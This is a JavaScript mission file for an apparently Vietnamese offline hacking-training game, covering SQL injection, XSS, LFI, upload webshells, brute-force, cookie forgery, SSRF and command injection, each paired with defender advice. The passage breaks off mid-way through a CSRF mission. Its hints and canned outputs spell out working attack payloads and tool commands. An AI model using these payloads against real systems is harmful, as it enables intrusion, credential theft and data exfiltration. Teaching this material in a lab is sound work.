// Mission MỚI (bổ sung) cho Chương 6 — Web Vulnerabilities. Bám OWASP Top 10 (A01/A03/A05/A07/A10) / PortSwigger.
// Engine offline: lệnh file-based (cat/grep) KHÔNG có output (engine sinh từ filesystem);
// lệnh tool (curl/sqlmap/hydra) PHẢI có output canned tiếng Anh giống response thật.
import fsC6M4 from '../filesystems/chapter6-mission4.js';
import fsC6M5 from '../filesystems/chapter6-mission5.js';
import fsC6M6 from '../filesystems/chapter6-mission6.js';
import fsC6M7 from '../filesystems/chapter6-mission7.js';
import fsC6M8 from '../filesystems/chapter6-mission8.js';
import fsC6M9 from '../filesystems/chapter6-mission9.js';
import fsC6M10 from '../filesystems/chapter6-mission10.js';
import fsC6M11 from '../filesystems/chapter6-mission11.js';
import fsC6M12 from '../filesystems/chapter6-mission12.js';
import fsC6M13 from '../filesystems/chapter6-mission13.js';
import fsC6M14 from '../filesystems/chapter6-mission14.js';
import fsC6M15 from '../filesystems/chapter6-mission15.js';
import fsC6M16 from '../filesystems/chapter6-mission16.js';
import fsC6M17 from '../filesystems/chapter6-mission17.js';
import fsC6M18 from '../filesystems/chapter6-mission18.js';
import fsC6M19 from '../filesystems/chapter6-mission19.js';
import fsC6M20 from '../filesystems/chapter6-mission20.js';

export default [
  {
    id: 4,
    chapterId: 6,
    title: 'SQLi rút dữ liệu (UNION)',
    story:
      'product.php?id=1 nối thẳng id vào câu SELECT. Không chỉ bypass — mày sẽ dùng UNION để ghép kết quả query của mày vào trang, rồi rút thẳng bảng users (username + password hash) ra màn hình.',
    steps: [
      {
        id: 'inspect',
        description: 'Đọc source xác nhận id nối thẳng vào query (mấy cột?)',
        match: /^cat\s+.*product\.php/,
      },
      {
        id: 'column_count',
        description: 'Tìm số cột bằng ORDER BY (tăng tới khi báo lỗi)',
        match: /(curl|http).*id=1.*order\s+by\s+\d+/i,
        output: [
          '# ...?id=1 ORDER BY 4--   -> 200 OK (trang bình thường)',
          '# ...?id=1 ORDER BY 5--   -> Error: Unknown column \'5\' in \'order clause\'',
          '=> bảng có đúng 4 cột.',
        ].join('\n'),
      },
      {
        id: 'find_visible',
        description: 'Dùng UNION SELECT 1,2,3,4 tìm cột nào hiển thị ra trang',
        match: /(curl|http).*union\s+select\s+1\s*,\s*2\s*,\s*3/i,
        output: '# ...?id=0 UNION SELECT 1,2,3,4--  -> trang in ra "2" và "4" => cột 2,4 là cột hiển thị (reflected).',
      },
      {
        id: 'exfiltrate',
        description: 'Rút username + password từ bảng users qua cột hiển thị',
        match: /(curl|http).*union\s+select.*(username|password|users)/i,
        output: [
          '# ...?id=0 UNION SELECT 1,username,3,password FROM users--',
          'admin   |   $2y$10$Vch1k...e9 (bcrypt)',
          'devops  |   $2y$10$Qa7Lm...zX (bcrypt)',
          '=> dumped credentials qua UNION-based SQLi.',
        ].join('\n'),
      },
    ],
    hints: [
      'UNION ghép thêm một câu SELECT của mày vào kết quả — nhưng số cột phải KHỚP.',
      'Đếm cột trước: `?id=1 ORDER BY 1--`, `2--`, `3--`... đến khi lỗi (cột vừa lỗi - 1 = số cột). Rồi `?id=0 UNION SELECT 1,2,3,4--` để xem cột nào in ra.',
      'Đặt id thật thành không-tồn-tại (id=0) để chỉ hàng UNION hiện ra, rồi `UNION SELECT 1,username,3,password FROM users--` đẩy dữ liệu vào cột hiển thị.',
    ],
    debrief: [
      'UNION-based SQLi cho phép "ghép" kết quả một truy vấn tùy ý vào trang gốc — biến lỗ hổng thành công cụ rút toàn bộ database, không chỉ bypass một bước.',
      'Bí quyết là khớp số cột (ORDER BY hoặc tăng dần UNION SELECT NULL) và tìm cột nào thực sự render ra HTML — chỉ cột "hiển thị" mới đẩy dữ liệu ra được.',
      'information_schema (CSDL metadata của MySQL) cho attacker liệt kê tên bảng/cột khi chưa biết schema: UNION SELECT table_name FROM information_schema.tables--.',
      'DEFENDER: dùng prepared statement / parameterized query (dữ liệu tách khỏi mã SQL) là biện pháp gốc; least-privilege cho DB user (không cho đọc information_schema/bảng khác nếu không cần); ép kiểu input số; WAF chỉ là lớp phụ.',
    ],
    terms: [
      { term: 'UNION SQLi', def: 'Dùng toán tử UNION để nối kết quả truy vấn của attacker vào output của truy vấn gốc, rút dữ liệu bảng khác.' },
      { term: 'Column count', def: 'Số cột truy vấn gốc trả về; UNION đòi đúng số cột này (tìm bằng ORDER BY n hoặc UNION SELECT NULL...).' },
      { term: 'information_schema', def: 'CSDL hệ thống chứa metadata (tên bảng, cột); query nó để khám phá schema khi chưa biết cấu trúc.' },
      { term: 'Exfiltration', def: 'Rút dữ liệu nhạy (credentials, PII) ra khỏi hệ thống qua chính lỗ hổng.' },
    ],
    initialFilesystem: fsC6M4,
  },
  {
    id: 5,
    chapterId: 6,
    title: 'SQLi mù & sqlmap',
    story:
      'search.php?id=1 cũng dính SQLi, nhưng trang KHÔNG in dữ liệu ra — chỉ đổi giữa "có/không tìm thấy". Đây là blind SQLi: mày phải hỏi database từng câu đúng/sai, rồi để sqlmap tự động hoá khi quá mệt.',
    steps: [
      {
        id: 'inspect',
        description: 'Đọc source thấy query chạy nhưng không echo dữ liệu (blind)',
        match: /^cat\s+.*search\.php/,
      },
      {
        id: 'boolean',
        description: 'Xác nhận blind boolean: 1=1 (true) vs 1=2 (false) cho 2 trang khác nhau',
        match: /(curl|http).*(and\s+1\s*=\s*1|and\s+1\s*=\s*2)/i,
        output: [
          '# ...?id=1 AND 1=1--   -> "Sản phẩm tồn tại"   (TRUE)',
          '# ...?id=1 AND 1=2--   -> "Không tìm thấy"     (FALSE)',
          '=> phản hồi đổi theo true/false => boolean-based blind SQLi.',
        ].join('\n'),
      },
      {
        id: 'time_based',
        description: 'Kiểm chứng time-based khi không có khác biệt nội dung (SLEEP)',
        match: /(curl|http).*sleep\s*\(\s*5\s*\)/i,
        output: '# ...?id=1 AND SLEEP(5)--   -> phản hồi trễ ~5s => time-based blind xác nhận (suy ra dữ liệu qua độ trễ).',
      },
      {
        id: 'sqlmap',
        description: 'Để sqlmap tự động dump bảng users',
        match: /^sqlmap\b.*(--dbs|--dump|-T\s+users)/,
        output: [
          'sqlmap identified the following injection point:',
          '  Parameter: id (GET)  Type: boolean-based blind / time-based blind',
          'Database: acme_db   Table: users   [2 entries]',
          '+----+----------+--------------------------------+',
          '| id | username | password                       |',
          '+----+----------+--------------------------------+',
          '| 1  | admin    | $2y$10$Vch1k...e9               |',
          '| 2  | devops   | $2y$10$Qa7Lm...zX               |',
          '+----+----------+--------------------------------+',
        ].join('\n'),
      },
    ],
    hints: [
      'Trang không in dữ liệu nhưng phản ứng KHÁC nhau giữa điều kiện đúng/sai -> đó là kênh rò rỉ.',
      'Boolean: so `?id=1 AND 1=1--` với `?id=1 AND 1=2--`. Không khác nội dung thì dùng time-based `?id=1 AND SLEEP(5)--` (trễ = true).',
      'Khi đã chắc chắn, để sqlmap làm: `sqlmap -u "http://target/search.php?id=1" --dbs` rồi `--dump -T users`.',
    ],
    debrief: [
      'Blind SQLi không trả dữ liệu trực tiếp; attacker suy ra từng bit qua kênh phụ — phản hồi true/false (boolean) hoặc độ trễ (time-based với SLEEP/WAITFOR). Chậm nhưng vẫn rút được cả DB.',
      'Time-based là cứu cánh khi nội dung trang không đổi gì cả: ép DB "ngủ" nếu điều kiện đúng, rồi đo thời gian phản hồi để đọc dữ liệu.',
      'sqlmap tự động hóa toàn bộ: phát hiện điểm inject, chọn kỹ thuật, bypass WAF (--tamper), và dump dữ liệu — nhưng hiểu thủ công trước mới biết nó đang làm gì và chỉnh khi nó kẹt.',
      'DEFENDER: vẫn là prepared statements (chặn tận gốc bất kể blind hay không); time-based phơi bày qua phản hồi chậm bất thường -> giám sát latency; WAF + rate-limit làm sqlmap cực chậm/lộ; least-privilege DB giảm thiệt hại.',
    ],
    terms: [
      { term: 'Blind SQLi (boolean)', def: 'Suy dữ liệu qua phản hồi đúng/sai khác nhau khi trang không in kết quả query trực tiếp.' },
      { term: 'Blind SQLi (time-based)', def: 'Ép DB trễ (SLEEP/WAITFOR) khi điều kiện đúng; đo thời gian để đọc dữ liệu từng bit.' },
      { term: 'WAF bypass', def: 'Né bộ lọc/firewall web bằng mã hóa, đổi case, comment chèn giữa từ khóa SQL (sqlmap --tamper).' },
      { term: 'sqlmap', def: 'Công cụ tự động phát hiện & khai thác SQLi: dò điểm inject, dump DB, crack hash, đọc/ghi file.' },
    ],
    initialFilesystem: fsC6M5,
  },
  {
    id: 6,
    chapterId: 6,
    title: 'Reflected & DOM XSS',
    story:
      'search.php echo thẳng tham số q ra HTML; còn profile.js đọc location.hash nhét vào innerHTML. Hai loại XSS khác bản chất — một do server, một thuần client. Mày phải phân biệt và khai thác cả hai.',
    steps: [
      {
        id: 'inspect_reflected',
        description: 'Đọc search.php thấy q in thẳng ra HTML (reflected, server-side)',
        match: /^cat\s+.*search\.php/,
      },
      {
        id: 'reflected_xss',
        description: 'Bắn payload reflected qua tham số q, xác nhận script phản chiếu',
        match: /(curl|http).*q=.*(<script>|%3Cscript)/i,
        output: [
          '# GET /search.php?q=<script>alert(1)</script>',
          '<h2>Kết quả cho: <script>alert(1)</script></h2>',
          '=> payload phản chiếu nguyên văn vào HTML, chạy trong trình duyệt nạn nhân (reflected XSS).',
        ].join('\n'),
      },
      {
        id: 'inspect_dom',
        description: 'Đọc profile.js xác định source (location.hash) và sink (innerHTML)',
        match: /^cat\s+.*profile\.js/,
      },
      {
        id: 'dom_xss',
        description: 'Khai thác DOM XSS qua #hash với payload không cần thẻ script',
        match: /(location\.hash|#.*<img|onerror=|#.*svg)/i,
        output: [
          '# https://target/profile#<img src=x onerror=alert(document.domain)>',
          '=> JS gán location.hash vào innerHTML; <script> không tự chạy qua innerHTML',
          '   nên dùng <img onerror> -> code chạy. Đây là DOM XSS (thuần client, server không thấy gì).',
        ].join('\n'),
      },
    ],
    hints: [
      'Reflected: server lấy input -> nhả lại trong response. DOM: JS phía client tự lấy input -> ghi vào DOM. Khác nguồn gốc.',
      'Reflected: `curl "http://target/search.php?q=<script>alert(1)</script>"` -> thấy script nằm nguyên trong HTML.',
      'DOM: source là `location.hash`, sink `innerHTML`. innerHTML không chạy <script>, nên dùng `#<img src=x onerror=alert(document.domain)>`.',
    ],
    debrief: [
      'Ba loại XSS khác nhau về đường đi: Reflected (payload đi qua request rồi server nhả lại ngay), Stored (payload được lưu, bắn vào mọi người xem sau), DOM (payload không bao giờ tới server — JS client tự đọc nguồn rồi ghi vào sink).',
      'DOM XSS là cặp source -> sink: nguồn dữ liệu attacker kiểm soát (location.hash/search, document.referrer) chảy vào sink nguy hiểm (innerHTML, document.write, eval) mà không sanitize.',
      'innerHTML không tự chạy <script> được chèn động, nên payload DOM thường dùng <img onerror>/<svg onload> — hiểu sink để chọn đúng payload.',
      'DEFENDER: output encoding theo ngữ cảnh (HTML/attr/JS/URL) là biện pháp gốc; Content-Security-Policy chặn inline script & nguồn lạ; dùng textContent thay innerHTML, tránh sink nguy hiểm; framework auto-escape (React) nếu không cố tình dùng dangerouslySetInnerHTML.',
    ],
    terms: [
      { term: 'Reflected XSS', def: 'Payload gửi trong request, server nhả lại ngay trong response và chạy ở trình duyệt nạn nhân.' },
      { term: 'Stored XSS', def: 'Payload được lưu (DB, comment) rồi tự động bắn vào mọi người mở trang sau đó — tác động rộng nhất.' },
      { term: 'DOM XSS', def: 'JS phía client đọc nguồn attacker kiểm soát và ghi vào DOM; payload không bao giờ tới server.' },
      { term: 'Source/Sink', def: 'Source = nơi dữ liệu attacker vào (location.hash); Sink = hàm nguy hiểm nhận nó (innerHTML, eval).' },
      { term: 'CSP', def: 'Content-Security-Policy: header giới hạn nguồn script/style được chạy, giảm mạnh tác động XSS.' },
    ],
    initialFilesystem: fsC6M6,
  },
  {
    id: 7,
    chapterId: 6,
    title: 'Đọc file qua LFI',
    story:
      'index.php?page=... include thẳng tham số page, không chặn gì. Mày phải dùng path traversal đọc /etc/passwd, rồi nâng cấp: php://filter để đọc cả source PHP, và nghĩ tới chuỗi log poisoning để biến "đọc file" thành "chạy code".',
    steps: [
      {
        id: 'inspect',
        description: 'Đọc index.php xác nhận include tham số page không lọc',
        match: /^cat\s+.*index\.php/,
      },
      {
        id: 'traverse_passwd',
        description: 'Path traversal đọc /etc/passwd (xác minh nội dung thật)',
        match: /^(cat|grep)\s+\/etc\/passwd/,
      },
      {
        id: 'php_filter',
        description: 'Dùng php://filter base64 để lôi nguyên source PHP ra',
        match: /(curl|http).*php:\/\/filter.*base64/i,
        output: [
          '# ...?page=php://filter/convert.base64-encode/resource=index.php',
          'PD9waHAKJHBhZ2UgPSAkX0dFVFsicGFnZSJdOwppbmNsdWRlKCIvdmFy...',
          '=> base64 này decode ra chính source index.php (lộ code, nối tiếp đọc config/db).',
        ].join('\n'),
      },
      {
        id: 'log_chain',
        description: 'Nhận diện chuỗi LFI -> include access.log để log poisoning (RCE)',
        match: /(curl|http).*page=.*access\.log/i,
        output: [
          '# ...?page=../../../../var/log/apache2/access.log',
          '=> include được file log. Bước tiếp: nhét PHP vào User-Agent (log poisoning)',
          '   rồi include lại access.log -> PHP trong log được thực thi => RCE (xem bài upload/RCE).',
        ].join('\n'),
      },
    ],
    hints: [
      'page được include thẳng -> mày kiểm soát đường dẫn file server sẽ nạp.',
      'Traversal: `?page=../../../../etc/passwd`. Thử đọc thật: `cat /etc/passwd` để thấy root, www-data, devops.',
      'Đọc source PHP: `?page=php://filter/convert.base64-encode/resource=index.php` rồi base64 -d. Nâng lên RCE: include `access.log` rồi poison User-Agent.',
    ],
    debrief: [
      'LFI (Local File Inclusion) cho attacker bắt server nạp file cục bộ tùy ý — /etc/passwd để xác nhận, file config để lấy creds, và (nguy hiểm nhất) chuỗi tới RCE.',
      'php:// wrapper biến LFI "chỉ đọc" thành công cụ mạnh: php://filter base64-encode đọc được cả source PHP (mà include thường sẽ thực thi), lộ logic và secret.',
      'Log poisoning là cú nối kinh điển: ghi PHP vào một file mà server log lại (User-Agent vào access.log), rồi LFI include chính file log đó -> PHP chạy -> RCE. "Đọc file" bắc cầu thành "chạy lệnh".',
      'DEFENDER: tuyệt đối không include theo input người dùng — dùng whitelist trang cố định; tắt allow_url_include/allow_url_fopen; chống ../ bằng canonicalize + kiểm tra realpath nằm trong thư mục cho phép; tách thư mục log khỏi tầm include của web.',
    ],
    terms: [
      { term: 'LFI vs RFI', def: 'LFI include file CỤC BỘ trên server; RFI include file từ URL ngoài (nguy hơn nhưng thường bị tắt allow_url_include).' },
      { term: '../ traversal', def: 'Dùng ../ để nhảy lên thư mục cha, thoát khỏi thư mục dự kiến và chạm file hệ thống (/etc/passwd).' },
      { term: 'PHP wrappers', def: 'php://filter, php://input, data:// — luồng đặc biệt biến LFI thành đọc source, ghi/chạy code.' },
      { term: 'Canonicalization', def: 'Chuẩn hóa đường dẫn (gộp ../, symlink) để so với whitelist; thiếu nó là gốc của lỗi traversal.' },
    ],
    initialFilesystem: fsC6M7,
  },
  {
    id: 8,
    chapterId: 6,
    title: 'Directory traversal & upload',
    story:
      'upload.php chỉ chặn đuôi ".php" chính xác. Mày sẽ vượt filter bằng đuôi biến thể (.pHp, .php.jpg), drop webshell vào /uploads, rồi gọi nó với ?cmd=id để chạy lệnh dưới quyền www-data.',
    steps: [
      {
        id: 'inspect',
        description: 'Đọc upload.php thấy filter đuôi yếu (chỉ chặn ".php" đúng case)',
        match: /^cat\s+.*upload\.php/,
      },
      {
        id: 'encoded_traversal',
        description: 'Thử path traversal mã hoá URL (..%2f) để hiểu bypass encoding',
        match: /(curl|http).*(\.\.%2f|%2e%2e%2f|\.\.%252f)/i,
        output: [
          '# GET /download?file=..%2f..%2f..%2fetc%2fpasswd',
          '=> %2f giải mã thành "/" sau khi qua bộ lọc ngây thơ chỉ chặn "../" dạng literal',
          '   -> đọc được /etc/passwd. Bộ lọc dựa trên chuỗi thô luôn thua encoding.',
        ].join('\n'),
      },
      {
        id: 'bypass_upload',
        description: 'Bypass filter upload bằng đuôi biến thể (.pHp / .php.jpg)',
        match: /(curl|http).*(\.pHp|\.php\.jpg|\.phtml|\.php5)/i,
        output: [
          '# POST /upload.php  file=shell.pHp   (hoặc shell.php.jpg)',
          'Upload xong: uploads/shell.pHp',
          '=> filter so đúng ".php" (case-sensitive) nên .pHp / .php.jpg lọt -> webshell đã nằm trên server.',
        ].join('\n'),
      },
      {
        id: 'rce',
        description: 'Gọi webshell với ?cmd=id để chạy lệnh (RCE)',
        match: /(curl|http).*uploads\/.*\?cmd=/i,
        output: [
          '# GET /uploads/shell.pHp?cmd=id',
          'uid=33(www-data) gid=33(www-data) groups=33(www-data)',
          '=> RCE thành www-data. Từ đây chuyển sang privesc (Chương 7).',
        ].join('\n'),
      },
    ],
    hints: [
      'Filter dựa trên so chuỗi thô (đuôi đúng ".php", hay "../" literal) luôn có biến thể lọt qua.',
      'Traversal mã hoá: `..%2f` thay cho `../`. Upload: đổi đuôi `shell.pHp` hoặc `shell.php.jpg` để vượt check ".php".',
      'Sau khi upload lọt, gọi `curl "http://target/uploads/shell.pHp?cmd=id"` -> thấy uid=33(www-data) là RCE thành công.',
    ],
    debrief: [
      'Lọc bằng blacklist/so chuỗi thô luôn thua: chặn "../" thì dùng ..%2f hoặc ..%252f (double-encode); chặn ".php" thì .pHp/.php.jpg/.phtml — attacker chỉ cần một biến thể server vẫn xử lý như PHP.',
      'Upload file nguy hiểm = RCE: một webshell .php nằm trong thư mục thực thi được cho phép chạy lệnh tùy ý dưới quyền tiến trình web (www-data) — bàn đạp vào hệ thống.',
      'Encoding bypass khai thác việc filter và hàm xử lý file "hiểu" chuỗi khác nhau: filter thấy %2f, filesystem thấy /. Chuẩn hóa phải làm TRƯỚC khi kiểm tra.',
      'DEFENDER: whitelist đuôi cho phép (không blacklist); kiểm tra MIME/magic bytes thật, không tin đuôi; đổi tên file ngẫu nhiên; lưu upload NGOÀI webroot hoặc thư mục cấm thực thi (php_admin_flag engine off); canonicalize path trước khi kiểm tra traversal.',
    ],
    terms: [
      { term: 'Encoding bypass', def: 'Mã hóa ký tự (%2f, double-encode) để filter chuỗi thô không nhận ra payload còn filesystem vẫn hiểu.' },
      { term: 'Upload filter', def: 'Cơ chế chặn file nguy hiểm khi upload; yếu nếu chỉ check đuôi/blacklist thay vì whitelist + magic bytes.' },
      { term: 'Webshell', def: 'File script (PHP/JSP/ASP) đặt trên server cho phép chạy lệnh hệ thống qua HTTP — cửa hậu RCE.' },
      { term: 'RCE', def: 'Remote Code Execution: chạy lệnh/code tùy ý trên máy nạn nhân — mức nghiêm trọng cao nhất của web.' },
    ],
    initialFilesystem: fsC6M8,
  },
  {
    id: 9,
    chapterId: 6,
    title: 'Phá xác thực',
    story:
      'Trang login không có rate-limit, và session cookie nhìn rất đáng ngờ. Mày sẽ brute-force credential bằng hydra, rồi mổ token base64 — nếu nó chỉ là "user:role" mã hoá thì mày tự forge cookie admin được.',
    steps: [
      {
        id: 'brute',
        description: 'Brute-force login bằng hydra (http-post-form)',
        match: /^hydra\b.*http-post-form/i,
        output: [
          'Hydra v9.5 starting...',
          '[DATA] attacking http-post-form://target/login',
          '[80][http-post-form] host: target   login: admin   password: Spring2024!',
          '1 of 1 target successfully completed, 1 valid password found',
        ].join('\n'),
      },
      {
        id: 'inspect_token',
        description: 'Đọc cookie bắt được, nhận ra nó là base64',
        match: /^cat\s+.*captured_cookie\.txt/,
      },
      {
        id: 'forge_cookie',
        description: 'Giải mã token thấy cấu trúc đoán được, forge cookie admin',
        match: /(echo\b.*base64|base64\b.*-d|YWRtaW46YWRtaW46|admin:admin)/i,
        output: [
          '# echo Z3Vlc3Q6dXNlcjoxMDAy | base64 -d   -> guest:user:1002',
          '# token = base64("username:role:id"), không ký, không kiểm tính toàn vẹn',
          '# forge admin: echo -n "admin:admin:1" | base64 -> YWRtaW46YWRtaW46MQ==',
          '# curl -H "Cookie: session=YWRtaW46YWRtaW46MQ==" http://target/dashboard',
          '=> đăng nhập thành admin mà không cần mật khẩu (broken auth / weak token).',
        ].join('\n'),
      },
    ],
    hints: [
      'Hai điểm yếu: login không giới hạn số lần thử, và token tự chế không có chữ ký.',
      'Brute: `hydra -l admin -P rockyou.txt target http-post-form "/login:user=^USER^&pass=^PASS^:Sai mật khẩu"`.',
      'Mổ token: `cat /home/hacker/captured_cookie.txt` rồi `echo <token> | base64 -d`. Nếu là "user:role:id", forge `admin:admin:1` rồi base64 lại làm cookie.',
    ],
    debrief: [
      'Broken authentication gom nhiều lỗi: cho brute-force vô hạn (không rate-limit/lockout/CAPTCHA), mật khẩu yếu, và quản lý session hớ — mỗi cái đủ để chiếm tài khoản.',
      'Token tự chế mà chỉ base64 "user:role:id" thì base64 KHÔNG phải mã hóa — chỉ là encode, ai cũng giải và sửa được. Thiếu chữ ký/HMAC nghĩa là server tin mù dữ liệu client gửi (forge thành admin).',
      'Credential stuffing/brute-force ăn theo việc người dùng tái dùng mật khẩu rò rỉ; không rate-limit biến nó thành tự động hoàn toàn.',
      'DEFENDER: rate-limit + account lockout + CAPTCHA sau vài lần sai; bắt buộc MFA; session token phải ngẫu nhiên đủ dài & lưu server-side (hoặc JWT có chữ ký HMAC/RSA, validate mỗi request); không nhét quyền vào cookie không ký; theo dõi đăng nhập thất bại hàng loạt.',
    ],
    terms: [
      { term: 'Broken auth', def: 'Nhóm lỗi xác thực/quản lý session yếu cho phép chiếm tài khoản (brute-force, token đoán được, session hớ).' },
      { term: 'Credential stuffing', def: 'Thử hàng loạt cặp user/pass rò rỉ từ vụ breach khác, ăn theo thói quen tái dùng mật khẩu.' },
      { term: 'Weak token', def: 'Token đoán/giả mạo được vì không ngẫu nhiên hoặc không ký (base64 thuần) — server tin mù dữ liệu client.' },
      { term: 'Session fixation', def: 'Attacker ép nạn nhân dùng session ID mình biết trước, rồi chiếm phiên sau khi nạn nhân đăng nhập.' },
    ],
    initialFilesystem: fsC6M9,
  },
  {
    id: 10,
    chapterId: 6,
    title: 'SSRF & lộ thông tin',
    story:
      'fetch.php?url=... để server tự đi tải URL người dùng nhập, không whitelist. Mày sẽ ép nó request nội bộ (localhost/admin), rồi đòn chí mạng: gọi endpoint cloud metadata 169.254.169.254 để moi credential, và file:// để đọc file local — kết thúc bằng cờ.',
    steps: [
      {
        id: 'inspect',
        description: 'Đọc fetch.php xác nhận server tự fetch URL không lọc (SSRF)',
        match: /^cat\s+.*fetch\.php/,
      },
      {
        id: 'internal',
        description: 'Ép server request dịch vụ nội bộ (localhost/admin) mà ngoài không vào được',
        match: /(curl|http).*url=.*(localhost|127\.0\.0\.1).*admin/i,
        output: [
          '# ...fetch.php?url=http://localhost/admin',
          '<h1>Admin Panel</h1> Internal only — bạn đang truy cập qua SSRF.',
          '=> server tự gọi tới chính nó; ranh giới "nội bộ" bị vượt vì request xuất phát từ server.',
        ].join('\n'),
      },
      {
        id: 'cloud_metadata',
        description: 'Tấn công endpoint cloud metadata để moi credential tạm thời',
        match: /(curl|http).*url=.*169\.254\.169\.254/i,
        output: [
          '# ...fetch.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/web-role',
          '{ "AccessKeyId": "ASIA...EXAMPLE", "SecretAccessKey": "wJalr...EXAMPLE",',
          '  "Token": "IQoJb3...", "Expiration": "2026-06-25T12:00:00Z" }',
          '=> lấy được IAM credential tạm thời của instance -> pivot vào cloud account.',
        ].join('\n'),
      },
      {
        id: 'read_flag',
        description: 'Dùng SSRF file:// (hoặc đọc trực tiếp) lấy cờ trong /admin',
        match: /^cat\s+\/var\/www\/html\/admin\/flag\.txt/,
      },
    ],
    hints: [
      'Server tự đi request thay mày -> mày mượn vị trí mạng của server để chạm thứ ngoài không chạm được.',
      'Nội bộ: `?url=http://localhost/admin`. Cloud: `?url=http://169.254.169.254/latest/meta-data/`. Local file: `?url=file:///etc/passwd`.',
      'Sau khi vào được vùng admin nội bộ, cờ nằm ở `/var/www/html/admin/flag.txt` — đọc bằng `cat`.',
    ],
    debrief: [
      'SSRF (Server-Side Request Forgery) biến server thành proxy của attacker: request xuất phát từ chính server nên vượt qua firewall và chạm dịch vụ "chỉ nội bộ" (admin panel, DB, microservice).',
      'Endpoint cloud metadata (169.254.169.254 trên AWS/GCP/Azure) là mục tiêu vàng của SSRF: trả IAM credential tạm thời của instance -> attacker pivot từ một lỗi web sang chiếm tài nguyên cloud.',
      'SSRF mù (blind) không trả nội dung về nhưng vẫn khai thác được qua tác dụng phụ (gọi internal API thay đổi trạng thái, quét port nội bộ qua chênh lệch thời gian/lỗi).',
      'DEFENDER: whitelist đích được phép thay vì để URL tự do; chặn IP nội bộ/link-local (127.0.0.0/8, 169.254.0.0/16, RFC1918); ép dùng IMDSv2 (token bắt buộc) cho metadata; tắt scheme nguy hiểm (file://, gopher://); cô lập tầng fetch bằng network policy.',
    ],
    terms: [
      { term: 'SSRF', def: 'Ép server gửi request tới đích attacker chọn; mượn vị trí mạng của server để chạm dịch vụ nội bộ.' },
      { term: 'Cloud metadata', def: 'Endpoint 169.254.169.254 trả thông tin & IAM credential của instance; SSRF tới đó = chiếm quyền cloud.' },
      { term: 'Blind SSRF', def: 'SSRF không trả nội dung về; khai thác qua tác dụng phụ (gọi internal API, quét port qua timing/lỗi).' },
      { term: 'Internal pivot', def: 'Dùng một chỗ đứng (SSRF/RCE) để vươn sâu hơn vào mạng/cloud nội bộ vốn không expose ra ngoài.' },
    ],
    initialFilesystem: fsC6M10,
  },
  {
    id: 11,
    chapterId: 6,
    title: 'Chèn lệnh qua tool ping',
    story:
      'ping.php là tool nội bộ "kiểm tra host sống không", nhận tham số host rồi tự chạy lệnh ping. Mày phát hiện nó ghép thẳng input vào shell — nghĩa là mày không chỉ ping, mày chạy được BẤT KỲ lệnh nào.',
    steps: [
      {
        id: 'inspect',
        description: 'Đọc source ping.php xác nhận host nối thẳng vào shell_exec',
        match: /^cat\s+.*ping\.php/,
      },
      {
        id: 'chain_cmd',
        description: 'Chèn thêm lệnh bằng dấu ; sau host hợp lệ để chạy whoami',
        match: /(curl|http).*host=.*(;|%3B|\|\||&&).*whoami/i,
        output: [
          '# GET /ping.php?host=127.0.0.1;whoami',
          'PING 127.0.0.1: 1 packets transmitted, 1 received',
          'www-data',
          '=> lệnh "whoami" chạy thêm sau dấu ; -> command injection xác nhận.',
        ].join('\n'),
      },
      {
        id: 'exfil',
        description: 'Dùng injection để đọc /etc/passwd qua cùng tham số',
        match: /(curl|http).*host=.*(;|%3B|\|\||&&).*(cat\s+\/etc\/passwd|etc%2fpasswd)/i,
        output: [
          '# GET /ping.php?host=127.0.0.1;cat%20/etc/passwd',
          'root:x:0:0:root:/root:/bin/bash',
          'www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin',
          '=> command injection cho phép chạy lệnh tùy ý dưới quyền www-data.',
        ].join('\n'),
      },
    ],
    hints: [
      'Nếu input của mày được nối thẳng vào một lệnh shell, dấu `;` hoặc `|` có thể nối thêm lệnh khác.',
      'Thử `?host=127.0.0.1;whoami` — dấu `;` kết thúc lệnh ping rồi chạy tiếp whoami.',
      'Đọc dữ liệu: `?host=127.0.0.1;cat /etc/passwd` (nhớ encode dấu cách thành %20 nếu cần qua URL).',
    ],
    debrief: [
      'Command injection xảy ra khi app gọi shell (system/exec/shell_exec) với input người dùng ghép thẳng vào — shell hiểu `;`, `|`, `&&`, `` ` ` `` như toán tử nối lệnh, không phải dữ liệu.',
      'Khác SQLi (chèn vào ngôn ngữ truy vấn) hay XSS (chèn vào HTML/JS), command injection chèn thẳng vào hệ điều hành — mức độ nghiêm trọng tương đương RCE ngay lập tức, không cần bước trung gian.',
      'Mỗi shell metachar có vai trò riêng: `;` chạy lệnh kế tiếp vô điều kiện, `&&` chỉ chạy nếu lệnh trước thành công, `|` đẩy output làm input lệnh sau, `` ` `` / `$()` chạy lệnh con và lấy kết quả.',
      'DEFENDER: không bao giờ ghép input vào shell command — dùng API ngôn ngữ thay vì gọi binary ngoài (vd hàm DNS resolve thay vì gọi ping); nếu buộc phải gọi, dùng hàm exec dạng array/escapeshellarg và whitelist ký tự cho phép (chỉ số/IP hợp lệ).',
    ],
    terms: [
      { term: 'Command Injection', def: 'Chèn lệnh hệ điều hành vào input mà app ghép thẳng vào shell, chạy được lệnh tùy ý.' },
      { term: 'Shell metacharacter', def: 'Ký tự đặc biệt shell hiểu như toán tử (`;`, `|`, `&&`, `` ` ``) thay vì dữ liệu thường.' },
      { term: 'shell_exec / system()', def: 'Hàm PHP/ngôn ngữ gọi ra shell hệ điều hành để chạy lệnh — nguy hiểm khi nhận input chưa lọc.' },
      { term: 'escapeshellarg', def: 'Hàm bọc input bằng quote để shell hiểu là MỘT chuỗi dữ liệu, không phải lệnh.' },
    ],
    initialFilesystem: fsC6M11,
  },
  {
    id: 12,
    chapterId: 6,
    title: 'CSRF — giả mạo request nạn nhân',
    story:
      'change-email.php đổi email tài khoản chỉ dựa vào session cookie, không có CSRF token nào trong form. Mày sẽ dựng một trang HTML tự submit, gửi cho nạn nhân (đang đăng nhập) — họ mở ra là email đổi luôn mà không hề biết.',
    steps: [
      {
        id: 'inspect',
        description: 'Đọc change-email.php xác nhận không kiểm tra CSRF token',
        match: /^cat\s+.*change-email\.php/,
      },
      {
        id: 'read_exploit',
        description: 'Đọc trang exploit.html đã dựng sẵn để hiểu cơ chế auto-submit',
        match: /^cat\s+.*exploit\.html/,
      },
      {
        id: 'simulate',
        description: 'Mô phỏng nạn nhân mở trang exploit (request POST tự động kèm session họ)',
        match: /(curl|http).*change-email\.php.*email=attacker@evil\.com/i,
        output: [
          '# Nạn nhân (đang login) mở exploit.html -> form tự POST tới change-email.php',
          '# Browser tự đính kèm cookie session của nạn nhân vào request này',
          'Email updated to attacker@evil.com',
